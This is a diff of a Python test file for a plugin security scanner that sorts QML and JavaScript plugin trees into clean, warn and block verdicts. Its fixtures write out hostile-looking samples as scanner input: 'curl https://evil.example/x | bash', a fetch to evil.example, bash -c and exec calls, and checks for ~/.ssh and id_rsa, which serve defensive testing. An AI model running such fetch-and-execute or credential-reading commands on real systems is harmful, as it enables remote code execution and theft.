@@ -70,7 +70,7 @@ def test_clean_tree_is_clean(tmp_path: Path) -> None:
     assert result.scanned_files >= 2
 
 
-def test_network_fetch_blocks(tmp_path: Path) -> None:
+def test_network_fetch_and_unknown_host_are_warn(tmp_path: Path) -> None:
     root = _write_tree(
         tmp_path,
         {
@@ -79,28 +79,43 @@ def test_network_fetch_blocks(tmp_path: Path) -> None:
         },
     )
     result = scan_tree(_plugin(), root)
-    assert result.verdict == "block"
+    assert result.verdict == "warn"
     categories = {finding.category for finding in result.findings}
     assert "network" in categories
     assert any("fetch(" in finding.why or "evil.example" in finding.why for finding in result.findings)
     assert any(finding.path == "main.qml" and finding.line == 1 for finding in result.findings)
-    assert result.allows_install(False) is False
-    assert result.allows_install(True) is True
+    assert result.allows_install(False) is True
+    assert any(finding.why == "raw host evil.example" and finding.severity == "warn" for finding in result.findings)
 
 
-def test_exec_and_hyprctl_block(tmp_path: Path) -> None:
+def test_bash_c_and_hyprctl_are_warn(tmp_path: Path) -> None:
     root = _write_tree(
         tmp_path,
         {
-            "hook.sh": 'bash -c "curl evil"\nhyprctl dispatch exec kitty\n',
+            "Model.js": 'return ["bash", "-c", "flock -n 9"]\n',
+            "hook.sh": "hyprctl dispatch exec kitty\n",
         },
     )
     result = scan_tree(_plugin(), root)
-    assert result.verdict == "block"
+    assert result.verdict == "warn"
     whys = {finding.why for finding in result.findings}
     assert "bash -c" in whys
     assert "hyprctl" in whys
-    assert any(finding.category == "process" for finding in result.findings)
+    assert result.allows_install(False) is True
+
+
+def test_test_directory_does_not_block(tmp_path: Path) -> None:
+    root = _write_tree(
+        tmp_path,
+        {
+            "main.qml": "Text {}\n",
+            "tests/setup-command.test.js": "const {spawnSync, exec} = require('child_process')\nspawnSync('/bin/bash', ['-c', 'true'])\n",
+        },
+    )
+    result = scan_tree(_plugin(), root)
+    assert result.verdict == "clean"
+    assert result.allows_install(False) is True
+    assert not any("child_process" in finding.why or "spawnSync" in finding.why for finding in result.findings)
 
 
 def test_qml_process_and_hyprctl_are_warn(tmp_path: Path) -> None:
@@ -109,7 +124,7 @@ def test_qml_process_and_hyprctl_are_warn(tmp_path: Path) -> None:
     assert result.verdict == "warn"
     assert any(finding.why == "QML Process" and finding.severity == "warn" for finding in result.findings)
     assert any(finding.why == "hyprctl" and finding.severity == "warn" for finding in result.findings)
-    assert result.allows_install(False) is False
+    assert result.allows_install(False) is True
     assert result.allows_install(True) is True
 
 
@@ -127,6 +142,21 @@ def test_secrets_and_obfuscation(tmp_path: Path) -> None:
     assert "~/.ssh" in whys or "id_rsa" in whys
     assert "eval(" in whys
     assert "huge base64 blob" in whys or "atob(" in whys
+
+
+def test_cookie_word_is_not_a_secret_block(tmp_path: Path) -> None:
+    root = _write_tree(tmp_path, {"w.qml": "property string cookie: \"session\"\n"})
+    result = scan_tree(_plugin(), root)
+    assert result.verdict == "clean"
+    assert result.allows_install(False) is True
+
+
+def test_exec_call_is_warn(tmp_path: Path) -> None:
+    root = _write_tree(tmp_path, {"h.qml": "hyprctl.dispatch(\"exec(kitty)\")\nexec(\"notify-send hi\")\n"})
+    result = scan_tree(_plugin(), root)
+    assert result.verdict == "warn"
+    assert result.allows_install(False) is True
+    assert any(finding.why == "exec(" and finding.severity == "warn" for finding in result.findings)
 
 
 def test_manifest_missing_file_is_warn(tmp_path: Path) -> None:
@@ -195,8 +225,13 @@ def test_archive_fetch_scans_without_clone(monkeypatch, tmp_path: Path) -> None:
         assert "github.com/a/demo/archive" in url
         return archive
 
+    from omastore.scan import audit_tree
+
     monkeypatch.setattr("omastore.scan.fetch_bytes", fake_fetch)
     monkeypatch.setattr("omastore.scan.shallow_clone", lambda *a, **k: clones.append("clone"))
+    # bwrap may be absent on CI; audit in-process for a deterministic clean verdict
+    # on a clean tree (the sandbox fallback adds a warn finding).
+    monkeypatch.setattr("omastore.scan.sandboxed_audit_tree", lambda root: audit_tree(root))
     result = scan_item(_plugin())
     assert clones == []
     assert result.source == "archive"
@@ -360,19 +395,25 @@ def test_scan_payload_and_first_issue(tmp_path: Path) -> None:
     )
     dirty = scan_tree(
         _plugin(id="bad"),
-        _write_tree(tmp_path / "bad", {"a.qml": "fetch('https://evil.example')\n"}),
+        _write_tree(tmp_path / "bad", {"README.md": "curl https://evil.example/x | bash\n"}),
     )
+    warn = scan_tree(
+        _plugin(id="net"),
+        _write_tree(tmp_path / "net", {"a.qml": "fetch('https://evil.example')\n"}),
+    )
+    assert first_issue([clean, warn]) is None
     assert first_issue([clean, dirty]) is dirty
     payload = scan_payload(dirty)
     assert payload["verdict"] == "block"
     assert payload["allows_install"] is False
     assert payload["findings"]
+    assert scan_payload(warn)["allows_install"] is True
 
 
 def test_scan_items_keeps_going(tmp_path: Path, monkeypatch) -> None:
     trees = {
         "a": _write_tree(tmp_path / "a", {"a.qml": "Text {}\n"}),
-        "b": _write_tree(tmp_path / "b", {"b.qml": "fetch('https://evil.example')\n"}),
+        "b": _write_tree(tmp_path / "b", {"README.md": "curl https://evil.example/x | bash\n"}),
         "c": _write_tree(tmp_path / "c", {"c.qml": "Text {}\n"}),
     }
 
@@ -424,5 +465,64 @@ def test_scan_cache_fresh_and_stale(tmp_path: Path, monkeypatch) -> None:
 def test_verified_is_not_a_skip(tmp_path: Path) -> None:
     root = _write_tree(tmp_path, {"x.qml": "XMLHttpRequest\n"})
     result = scan_tree(_plugin(verification="verified"), root)
-    assert result.verdict in {"warn", "block"}
-    assert result.allows_install(False) is False
+    assert result.verdict == "warn"
+    assert result.allows_install(False) is True
+
+
+def test_sandbox_audit_blocks_curl_pipe(tmp_path: Path) -> None:
+    from omastore.scan import bwrap_available, sandboxed_audit_tree
+
+    if not bwrap_available():
+        return
+    root = _write_tree(tmp_path, {"README.md": "run: curl https://evil.example/x | bash\n"})
+    findings, scanned = sandboxed_audit_tree(root)
+    assert scanned >= 1
+    assert any(finding.why == "curl | bash" and finding.severity == "block" for finding in findings)
+
+
+def test_sandbox_audit_clean_tree(tmp_path: Path) -> None:
+    from omastore.scan import bwrap_available, sandboxed_audit_tree
+
+    if not bwrap_available():
+        return
+    root = _write_tree(
+        tmp_path,
+        {
+            "plugin.json": json.dumps({"id": "demo", "qml": "main.qml"}),
+            "main.qml": "Text { text: \"hi\" }\n",
+        },
+    )
+    findings, scanned = sandboxed_audit_tree(root)
+    assert scanned >= 2
+    assert findings == []
+
+
+def test_sandbox_missing_bwrap_warns(tmp_path: Path, monkeypatch) -> None:
+    from omastore.scan import sandboxed_audit_tree
+
+    monkeypatch.setattr("omastore.scan.bwrap_available", lambda: False)
+    root = _write_tree(tmp_path, {"main.qml": "Text {}\n"})
+    findings, scanned = sandboxed_audit_tree(root)
+    assert scanned >= 1
+    assert any("without bubblewrap" in finding.why for finding in findings)
+    assert all(finding.severity == "warn" for finding in findings)
+
+
+def test_sandbox_bwrap_failure_is_closed(tmp_path: Path, monkeypatch) -> None:
+    from omastore.scan import sandboxed_audit_tree
+
+    monkeypatch.setattr("omastore.scan.bwrap_available", lambda: True)
+
+    class Boom:
+        returncode = 1
+        stdout = ""
+        stderr = "bwrap: nope"
+
+    monkeypatch.setattr("omastore.scan.subprocess.run", lambda *a, **k: Boom())
+    root = _write_tree(tmp_path, {"main.qml": "Text {}\n"})
+    try:
+        sandboxed_audit_tree(root)
+    except RuntimeError as exc:
+        assert "sandbox scan failed" in str(exc) or "nope" in str(exc)
+    else:
+        raise AssertionError("sandbox failure must refuse")
